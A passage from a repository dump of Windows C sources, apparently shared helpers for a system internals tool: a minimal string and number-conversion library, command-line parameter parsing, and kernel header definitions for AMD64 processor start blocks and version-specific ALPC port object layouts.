}

wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc)
{
	wchar_t *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
}

```

`Source/Shared/minirtl/cmdline.c`:

```c
#include <windows.h>

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (ParamLen != NULL)
		*ParamLen = 0;

	if (CmdLine == NULL) {
		if ((Buffer != NULL) && (BufferSize > 0))
			*Buffer = 0;
		return FALSE;
	}

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (CmdLine == NULL)
		return FALSE;

	if (ParamLen != NULL)
		*ParamLen = 0;

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

char *ExtractFilePathA(const char *FileName, char *FilePath)
{
	char *p = (char *)FileName, *p0 = (char *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (char *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath)
{
	wchar_t *p = (wchar_t *)FileName, *p0 = (wchar_t *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (wchar_t *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

```

`Source/Shared/minirtl/cmdline.h`:

```h
#ifndef _CMDLINEH_
#define _CMDLINEH_

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

char *ExtractFilePathA(const char *FileName, char *FilePath);
wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath);

#ifdef UNICODE

#define ExtractFilePath			ExtractFilePathW
#define GetCommandLineParam		GetCommandLineParamW

#else // ANSI

#define ExtractFilePath			ExtractFilePathA
#define GetCommandLineParam		GetCommandLineParamA

#endif

#endif /* _CMDLINEH_ */

```

`Source/Shared/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	4 Oct 2020
*/

#pragma once

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

char *_strcpyn_a(char* dest, const char* src, size_t n);
wchar_t *_strcpyn_w(wchar_t* dest, const wchar_t* src, size_t n);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

char *_strchr_a(const char *s, const char ch);
wchar_t *_strchr_w(const wchar_t *s, const wchar_t ch);


// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w
#define _strcpyn _strcpyn_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w
#define _strchr _strchr_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define _strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcpyn _strcpyn_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a
#define _strchr _strchr_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
#define u64tohex u64tohex_a

#define _strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`Source/Shared/minirtl/rtltypes.h`:

```h
#pragma once

#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`Source/Shared/minirtl/strtou64.c`:

```c
#include "rtltypes.h"

unsigned long long strtou64_a(char *s)
{
	unsigned long long 	a = 0;
	char				c;

	if (s == 0)
		return 0;

	while (*s != 0) {
		c = *s;
		if (_isdigit_w(c))
			a = (a*10)+((unsigned long long)c-'0');
		else
			break;
		s++;
	}
	return a;
}

unsigned long long strtou64_w(wchar_t *s)
{
	unsigned long long 	a = 0;
	wchar_t				c;

	if (s == 0)
		return 0;

	while (*s != 0) {
		c = *s;
		if (_isdigit_w(c))
			a = (a*10)+((unsigned long long)c-L'0');
		else
			break;
		s++;
	}
	return a;
}

```

`Source/Shared/minirtl/strtoul.c`:

```c
#include "rtltypes.h"

unsigned long strtoul_a(char *s)
{
	unsigned long	a = 0;
	char			c;

	if (s == 0)
		return 0;

	while (*s != 0) {
		c = *s;
		if (_isdigit_a(c))
			a = (a*10)+(c-'0');
		else
			break;
		s++;
	}
	return a;
}

unsigned long strtoul_w(wchar_t *s)
{
	unsigned long	a = 0;
	wchar_t			c;

	if (s == 0)
		return 0;

	while (*s != 0) {
		c = *s;
		if (_isdigit_w(c))
			a = (a*10)+(c-L'0');
		else
			break;
		s++;
	}
	return a;
}

```

`Source/Shared/minirtl/u64tohex.c`:

```c
#include "rtltypes.h"

size_t u64tohex_a(unsigned long long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c=0; c<16; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

size_t u64tohex_w(unsigned long long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c = 0; c<16; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

```

`Source/Shared/minirtl/ultohex.c`:

```c
#include "rtltypes.h"

size_t ultohex_a(unsigned long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

size_t ultohex_w(unsigned long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

```

`Source/Shared/ntos/halamd64.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2020
*  Taken from publicly available Microsoft sources or mentioned elsewhere.
*
*  TITLE:       HALAMD64.H
*
*  VERSION:     1.11
*
*  DATE:        12 Feb 2020
*
*  Common header file for the ntos HAL AMD64 definitions.
*
*  Depends on:    Windows.h
*
*  Include:       Windows.h
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#if defined (_MSC_VER) && (_MSC_VER >= 1020)
#pragma once
#endif

#ifndef HALAMD64_RTL
#define HALAMD64_RTL

#pragma warning(push)
#pragma warning(disable: 4214)

//
// HALAMD64_RTL HEADER BEGIN
//

#pragma pack(push,2)

typedef struct _FAR_JMP_16 {
    UCHAR  OpCode;  // = 0xe9
    USHORT Offset;
} FAR_JMP_16;

typedef struct _FAR_TARGET_32 {
    ULONG Offset;
    USHORT Selector;
} FAR_TARGET_32;

typedef struct _PSEUDO_DESCRIPTOR_32 {
    USHORT Limit;
    ULONG Base;
} PSEUDO_DESCRIPTOR_32;

#pragma pack(pop)

typedef union _KGDTENTRY64 {
    struct {
        USHORT  LimitLow;
        USHORT  BaseLow;
        union {
            struct {
                UCHAR   BaseMiddle;
                UCHAR   Flags1;
                UCHAR   Flags2;
                UCHAR   BaseHigh;
            } Bytes;

            struct {
                ULONG   BaseMiddle : 8;
                ULONG   Type : 5;
                ULONG   Dpl : 2;
                ULONG   Present : 1;
                ULONG   LimitHigh : 4;
                ULONG   System : 1;
                ULONG   LongMode : 1;
                ULONG   DefaultBig : 1;
                ULONG   Granularity : 1;
                ULONG   BaseHigh : 8;
            } Bits;
        };

        ULONG BaseUpper;
        ULONG MustBeZero;
    };

    ULONG64 Alignment;
} KGDTENTRY64, * PKGDTENTRY64;

typedef union _KIDTENTRY64 {
    struct {
        USHORT OffsetLow;
        USHORT Selector;
        USHORT IstIndex : 3;
        USHORT Reserved0 : 5;
        USHORT Type : 5;
        USHORT Dpl : 2;
        USHORT Present : 1;
        USHORT OffsetMiddle;
        ULONG OffsetHigh;
        ULONG Reserved1;
    };

    ULONG64 Alignment;
} KIDTENTRY64, * PKIDTENTRY64;

typedef union _KGDT_BASE {
    struct {
        USHORT BaseLow;
        UCHAR BaseMiddle;
        UCHAR BaseHigh;
        ULONG BaseUpper;
    };

    ULONG64 Base;
} KGDT_BASE, * PKGDT_BASE;

typedef union _KGDT_LIMIT {
    struct {
        USHORT LimitLow;
        USHORT LimitHigh : 4;
        USHORT MustBeZero : 12;
    };

    ULONG Limit;
} KGDT_LIMIT, * PKGDT_LIMIT;

#define PSB_GDT32_MAX       3

typedef struct _KDESCRIPTOR {
    USHORT Pad[3];
    USHORT Limit;
    PVOID Base;
} KDESCRIPTOR, * PKDESCRIPTOR;

typedef struct _KDESCRIPTOR32 {
    USHORT Pad[3];
    USHORT Limit;
    ULONG Base;
} KDESCRIPTOR32, * PKDESCRIPTOR32;

typedef struct _KSPECIAL_REGISTERS {
    ULONG64 Cr0;
    ULONG64 Cr2;
    ULONG64 Cr3;
    ULONG64 Cr4;
    ULONG64 KernelDr0;
    ULONG64 KernelDr1;
    ULONG64 KernelDr2;
    ULONG64 KernelDr3;
    ULONG64 KernelDr6;
    ULONG64 KernelDr7;
    KDESCRIPTOR Gdtr;
    KDESCRIPTOR Idtr;
    USHORT Tr;
    USHORT Ldtr;
    ULONG MxCsr;
    ULONG64 DebugControl;
    ULONG64 LastBranchToRip;
    ULONG64 LastBranchFromRip;
    ULONG64 LastExceptionToRip;
    ULONG64 LastExceptionFromRip;
    ULONG64 Cr8;
    ULONG64 MsrGsBase;
    ULONG64 MsrGsSwap;
    ULONG64 MsrStar;
    ULONG64 MsrLStar;
    ULONG64 MsrCStar;
    ULONG64 MsrSyscallMask;
} KSPECIAL_REGISTERS, * PKSPECIAL_REGISTERS;

typedef struct _KPROCESSOR_STATE {
    KSPECIAL_REGISTERS SpecialRegisters;
    CONTEXT ContextFrame;
} KPROCESSOR_STATE, * PKPROCESSOR_STATE;

typedef struct _PROCESSOR_START_BLOCK* PPROCESSOR_START_BLOCK;

typedef struct _PROCESSOR_START_BLOCK {

    //
    // The block starts with a jmp instruction to the end of the block
    //

    FAR_JMP_16 Jmp;

    //
    // Completion flag is set to non-zero when the target processor has
    // started
    //

    ULONG CompletionFlag;

    //
    // Pseudo descriptors for GDT and IDT.
    //

    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;

    //
    // The temporary 32-bit GDT itself resides here.
    //

    KGDTENTRY64 Gdt[PSB_GDT32_MAX + 1];

    //
    // Physical address of the 64-bit top-level identity-mapped page table.
    //

    ULONG64 TiledCr3;

    //
    // Far jump target from Rm to Pm code
    //

    FAR_TARGET_32 PmTarget;

    //
    // Far jump target from Pm to Lm code
    //

    FAR_TARGET_32 LmIdentityTarget;

    //
    // Address of LmTarget
    //

    PVOID LmTarget;

    //
    // Linear address of this structure
    //

    PPROCESSOR_START_BLOCK SelfMap;

    //
    // Contents of the PAT msr
    //

    ULONG64 MsrPat;

    //
    // Contents of the EFER msr
    //

    ULONG64 MsrEFER;

    //
    // Initial processor state for the processor to be started
    //

    KPROCESSOR_STATE ProcessorState;

} PROCESSOR_START_BLOCK;

#pragma warning(pop)

//
// HALAMD64_RTL HEADER END
//

#endif HALAMD64_RTL

```

`Source/Shared/ntos/ntalpc.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2022, translated from Microsoft sources/debugger
*
*  TITLE:       NTALPC.H
*
*  VERSION:     1.95
*
*  DATE:        02 Feb 2022
*
*  Common header file for the ntos ALPC/CSR related functions and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#if defined (_MSC_VER) && (_MSC_VER >= 1020)
#pragma once
#endif

#ifndef NTALPC_RTL
#define NTALPC_RTL

//
// NTALPC_RTL HEADER BEGIN
//

#if defined(__cplusplus)
extern "C" {
#endif

#pragma warning(push)
#pragma warning(disable: 4214) // nonstandard extension used : bit field types other than int

#define CSR_API_PORT_NAME               L"ApiPort"

#define WINSS_OBJECT_DIRECTORY_NAME     L"\\Windows"

#define CSRSRV_SERVERDLL_INDEX          0
#define CSRSRV_FIRST_API_NUMBER         0

#define BASESRV_SERVERDLL_INDEX         1
#define BASESRV_FIRST_API_NUMBER        0

#define CONSRV_SERVERDLL_INDEX          2
#define CONSRV_FIRST_API_NUMBER         512

#define USERSRV_SERVERDLL_INDEX         3
#define USERSRV_FIRST_API_NUMBER        1024

#define CSR_CSRSS_SECTION_SIZE          65536

#define ALPC_MSGFLG_REPLY_MESSAGE 0x1
#define ALPC_MSGFLG_LPC_MODE 0x2
#define ALPC_MSGFLG_RELEASE_MESSAGE 0x10000
#define ALPC_MSGFLG_SYNC_REQUEST 0x20000
#define ALPC_MSGFLG_WAIT_USER_MODE 0x100000
#define ALPC_MSGFLG_WAIT_ALERTABLE 0x200000
#define ALPC_MSGFLG_WOW64_CALL 0x80000000

typedef enum _ALPC_PORT_INFORMATION_CLASS {
    AlpcBasicInformation,
    AlpcPortInformation,
    AlpcAssociateCompletionPortInformation,
    AlpcConnectedSIDInformation,
    AlpcServerInformation,
    AlpcMessageZoneInformation,
    AlpcRegisterCompletionListInformation,
    AlpcUnregisterCompletionListInformation,
    AlpcAdjustCompletionListConcurrencyCountInformation,
    AlpcRegisterCallbackInformation,
    AlpcCompletionListRundownInformation,
    AlpcWaitForPortReferences,
    MaxAlpcInformation
} ALPC_PORT_INFORMATION_CLASS;

typedef struct _ALPC_SERVER_INFORMATION {
    union
    {
        struct
        {
            HANDLE ThreadHandle;
        } In;
        struct
        {
            BOOLEAN ThreadBlocked;
            HANDLE ConnectedProcessId;
            UNICODE_STRING ConnectionPortName;
        } Out;
    };
} ALPC_SERVER_INFORMATION, *PALPC_SERVER_INFORMATION;

typedef struct _ALPC_PORT_ATTRIBUTES {
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;

typedef struct _ALPC_MESSAGE_ATTRIBUTES {
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef struct _ALPC_BASIC_INFORMATION {
    ULONG Flags;
    ULONG SequenceNo;
    PVOID PortContext;
} ALPC_BASIC_INFORMATION, *PALPC_BASIC_INFORMATION;

typedef struct _ALPC_HANDLE_TABLE {
    struct _ALPC_HANDLE_ENTRY *Handles;
    ULONG TotalHandles;
    ULONG Flags;
    struct _EX_PUSH_LOCK Lock;
} ALPC_HADNLE_TABLE, *PALPC_HANDLE_TABLE;

// Windows 7 - Windows 8
typedef struct _ALPC_COMMUNICATION_INFO_V1 {
    struct _ALPC_PORT *ConnectionPort;
    struct _ALPC_PORT *ServerCommunicationPort;
    struct _ALPC_PORT *ClientCommunicationPort;
    struct _LIST_ENTRY CommunicationList;
    struct _ALPC_HANDLE_TABLE HandleTable;
} ALPC_COMMUNICATION_INFO_V1, *PALPC_COMMUNICATION_INFO_V1;

// Windows 8.1+
typedef struct _ALPC_COMMUNICATION_INFO_V2 {
    struct _ALPC_PORT *ConnectionPort;
    struct _ALPC_PORT *ServerCommunicationPort;
    struct _ALPC_PORT *ClientCommunicationPort;
    struct _LIST_ENTRY CommunicationList;
    struct _ALPC_HANDLE_TABLE HandleTable;
    struct _KALPC_MESSAGE *CloseMessage;
} ALPC_COMMUNICATION_INFO_V2, *PALPC_COMMUNICATION_INFO_V2;

//
// Compatible fields only structure.
//
typedef struct _ALPC_COMMUNICATION_INFO_COMPAT {
    struct _ALPC_PORT* ConnectionPort;
    struct _ALPC_PORT* ServerCommunicationPort;
    struct _ALPC_PORT* ClientCommunicationPort;
    struct _LIST_ENTRY CommunicationList;
    struct _ALPC_HANDLE_TABLE HandleTable;
} ALPC_COMMUNICATION_INFO_COMPAT, * PALPC_COMMUNICATION_INFO_COMPAT;

typedef union _ALPC_PORT_STATE {
    struct
    {
        unsigned long Initialized : 1;
        unsigned long Type : 2;
        unsigned long ConnectionPending : 1;
        unsigned long ConnectionRefused : 1;
        unsigned long Disconnected : 1;
        unsigned long Closed : 1;
        unsigned long NoFlushOnClose : 1;
        unsigned long ReturnExtendedInfo : 1;
        unsigned long Waitable : 1;
        unsigned long DynamicSecurity : 1;
        unsigned long Wow64CompletionList : 1;
        unsigned long Lpc : 1;
        unsigned long LpcToLpc : 1;
        unsigned long HasCompletionList : 1;
        unsigned long HadCompletionList : 1;
        unsigned long EnableCompletionList : 1;
    } s1;
    unsigned long State;
} ALPC_PORT_STATE, *PALPC_PORT_STATE;

//
// ALPC port object collection.
//
// Windows 7 ALPC port object.
//
typedef struct _ALPC_PORT_7600 {
    /* 0x0000 */ struct _LIST_ENTRY PortListEntry;
    /* 0x0010 */ struct _ALPC_COMMUNICATION_INFO_V1* CommunicationInfo;
    /* 0x0018 */ struct _EPROCESS* OwnerProcess;
    /* 0x0020 */ void* CompletionPort;
    /* 0x0028 */ void* CompletionKey;
    /* 0x0030 */ struct _ALPC_COMPLETION_PACKET_LOOKASIDE* CompletionPacketLookaside;
    /* 0x0038 */ void* PortContext;
    /* 0x0040 */ struct _SECURITY_CLIENT_CONTEXT StaticSecurity;
    /* 0x0088 */ struct _LIST_ENTRY MainQueue;
    /* 0x0098 */ struct _LIST_ENTRY PendingQueue;
    /* 0x00a8 */ struct _LIST_ENTRY LargeMessageQueue;
    /* 0x00b8 */ struct _LIST_ENTRY WaitQueue;
    union
    {
        /* 0x00c8 */ struct _KSEMAPHORE* Semaphore;
        /* 0x00c8 */ struct _KEVENT* DummyEvent;
    }; /* size: 0x0008 */
    /* 0x00d0 */ struct _ALPC_PORT_ATTRIBUTES PortAttributes;
    /* 0x0118 */ struct _EX_PUSH_LOCK Lock;
    /* 0x0120 */ struct _EX_PUSH_LOCK ResourceListLock;
    /* 0x0128 */ struct _LIST_ENTRY ResourceListHead;
    /* 0x0138 */ struct _ALPC_COMPLETION_LIST* CompletionList;
    /* 0x0140 */ struct _ALPC_MESSAGE_ZONE* MessageZone;
    /* 0x0148 */ struct _CALLBACK_OBJECT* CallbackObject;
    /* 0x0150 */ void* CallbackContext;
    /* 0x0158 */ struct _LIST_ENTRY CanceledQueue;
    /* 0x0168 */ volatile long SequenceNo;
    union
    {
        struct
        {
            unsigned long Initialized : 1; /* bit position: 0 */
            unsigned long Type : 2; /* bit position: 1 */
            unsigned long ConnectionPending : 1; /* bit position: 3 */
            unsigned long ConnectionRefused : 1; /* bit position: 4 */
            unsigned long Disconnected : 1; /* bit position: 5 */
            unsigned long Closed : 1; /* bit position: 6 */
            unsigned long NoFlushOnClose : 1; /* bit position: 7 */
            unsigned long ReturnExtendedInfo : 1; /* bit position: 8 */
            unsigned long Waitable : 1; /* bit position: 9 */
            unsigned long DynamicSecurity : 1; /* bit position: 10 */
            unsigned long Wow64CompletionList : 1; /* bit position: 11 */
            unsigned long Lpc : 1; /* bit position: 12 */
            unsigned long LpcToLpc : 1; /* bit position: 13 */
            unsigned long HasCompletionList : 1; /* bit position: 14 */
            unsigned long HadCompletionList : 1; /* bit position: 15 */
            unsigned long EnableCompletionList : 1; /* bit position: 16 */
        } s1;
        /* 0x016c */ unsigned long State;
    } u1;
    /* 0x0170 */ struct _ALPC_PORT* TargetQueuePort;
    /* 0x0178 */ struct _ALPC_PORT* TargetSequencePort;
    /* 0x0180 */ struct _KALPC_MESSAGE* volatile CachedMessage;
    /* 0x0188 */ unsigned long MainQueueLength;
    /* 0x018c */ unsigned long PendingQueueLength;
    /* 0x0190 */ unsigned long LargeMessageQueueLength;
    /* 0x0194 */ unsigned long CanceledQueueLength;
    /* 0x0198 */ unsigned long WaitQueueLength;
    /* 0x019c */ long __PADDING__[1];
} ALPC_PORT_7600, *PALPC_PORT_7600; /* size: 0x01a0 */

//
// Windows 8 ALPC port object.
//
typedef struct _ALPC_PORT_9200 {
    /* 0x0000 */ struct _LIST_ENTRY PortListEntry;
    /* 0x0010 */ struct _ALPC_COMMUNICATION_INFO_V1* CommunicationInfo;
    /* 0x0018 */ struct _EPROCESS* OwnerProcess;
    /* 0x0020 */ void* CompletionPort;
    /* 0x0028 */ void* CompletionKey;
    /* 0x0030 */ struct _ALPC_COMPLETION_PACKET_LOOKASIDE* CompletionPacketLookaside;
    /* 0x0038 */ void* PortContext;
    /* 0x0040 */ struct _SECURITY_CLIENT_CONTEXT StaticSecurity;
    /* 0x0088 */ struct _EX_PUSH_LOCK IncomingQueueLock;
    /* 0x0090 */ struct _LIST_ENTRY MainQueue;
    /* 0x00a0 */ struct _LIST_ENTRY LargeMessageQueue;
    /* 0x00b0 */ struct _EX_PUSH_LOCK PendingQueueLock;
    /* 0x00b8 */ struct _LIST_ENTRY PendingQueue;
    /* 0x00c8 */ struct _EX_PUSH_LOCK WaitQueueLock;
    /* 0x00d0 */ struct _LIST_ENTRY WaitQueue;
    union
    {
        /* 0x00e0 */ struct _KSEMAPHORE* Semaphore;
        /* 0x00e0 */ struct _KEVENT* DummyEvent;
    }; /* size: 0x0008 */
    /* 0x00e8 */ struct _ALPC_PORT_ATTRIBUTES PortAttributes;
    /* 0x0130 */ struct _EX_PUSH_LOCK ResourceListLock;
    /* 0x0138 */ struct _LIST_ENTRY ResourceListHead;
    /* 0x0148 */ struct _EX_PUSH_LOCK PortObjectLock;
    /* 0x0150 */ struct _ALPC_COMPLETION_LIST* CompletionList;
    /* 0x0158 */ struct _ALPC_MESSAGE_ZONE* MessageZone;
    /* 0x0160 */ struct _CALLBACK_OBJECT* CallbackObject;
    /* 0x0168 */ void* CallbackContext;
    /* 0x0170 */ struct _LIST_ENTRY CanceledQueue;
    /* 0x0180 */ long SequenceNo;
    union
    {
        struct
        {
            unsigned long Initialized : 1; /* bit position: 0 */
            unsigned long Type : 2; /* bit position: 1 */
            unsigned long ConnectionPending : 1; /* bit position: 3 */
            unsigned long ConnectionRefused : 1; /* bit position: 4 */
            unsigned long Disconnected : 1; /* bit position: 5 */
            unsigned long Closed : 1; /* bit position: 6 */
            unsigned long NoFlushOnClose : 1; /* bit position: 7 */
            unsigned long ReturnExtendedInfo : 1; /* bit position: 8 */
            unsigned long Waitable : 1; /* bit position: 9 */
            unsigned long DynamicSecurity : 1; /* bit position: 10 */
            unsigned long Wow64CompletionList : 1; /* bit position: 11 */
